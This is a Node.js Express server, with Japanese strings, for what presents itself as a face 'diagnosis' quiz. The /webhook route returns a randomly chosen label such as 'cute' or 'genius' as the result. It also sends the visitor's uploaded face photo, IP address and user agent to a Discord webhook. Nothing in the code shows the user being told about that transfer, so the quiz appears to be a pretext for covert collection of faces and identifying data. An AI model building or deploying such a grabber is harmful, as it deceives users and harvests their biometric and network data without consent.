import express from 'express';
import dotenv from 'dotenv';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';
import bodyParser from 'body-parser';
import requestIp from 'request-ip';
import FormData from 'form-data';

dotenv.config();

const app = express();

const port = process.env.PORT || 3000;
const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(requestIp.mw());

app.post('/webhook', async (req, res) => {
  const { image } = req.body;
  const ip = req.clientIp;
  const ua = req.headers['user-agent'];

  try {
    const form = new FormData();

    const resultList = ["イケメン", "かわいい", "天才", "不機嫌", "普通", "眠そう"];
    const random = resultList[Math.floor(Math.random() * resultList.length)];

    const payload = {
      content: `📷 新しい診断が行われました`,
      embeds: [
        {
          title: "診断情報",
          fields: [
            { name: "IPアドレス", value: ip || "不明", inline: false },
            { name: "ユーザーエージェント", value: ua || "不明", inline: false },
            { name: "診断結果", value: random, inline: false }
          ],
          image: {
            url: "attachment://face.png"
          }
        }
      ],
    };

    form.append('payload_json', JSON.stringify(payload));
    form.append('file', Buffer.from(image.split(',')[1], 'base64'), {
      filename: 'face.png',
      contentType: 'image/png'
    });

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: form.getHeaders(),
      body: form
    });

    if (!response.ok) {
      throw new Error(`Webhook送信に失敗しました: ${response.statusText}`);
    }

    res.json({ result: random });
  } catch (error) {
    console.error("Webhook送信エラー:", error);
    res.status(500).json({ error: '送信失敗' });
  }
});

app.listen(port, () => {
  console.log(`サーバー起動中: http://localhost:${port}`);
});